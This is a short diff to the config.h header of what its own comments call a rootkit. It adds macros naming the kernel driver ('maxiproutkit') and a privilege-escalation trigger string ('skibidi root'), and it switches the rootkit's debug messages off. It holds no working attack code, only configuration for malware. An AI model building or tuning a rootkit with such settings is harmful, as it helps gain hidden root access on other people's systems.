@@ -1,6 +1,8 @@
 #ifndef _RK_CONFIG_H
 #define _RK_CONFIG_H
 
+#define RK_DRIVER "maxiproutkit"
+#define RK_PRIVESC "skibidi root"
 /**
  * @file config.h
  * 
@@ -15,6 +17,6 @@
  * 
  * This macro enables or disables debugging messages in the rootkit.
  */
-#define ROOTKIT_DEBUG 1
+#define ROOTKIT_DEBUG 0
 
 #endif // RK_CONFIG_H
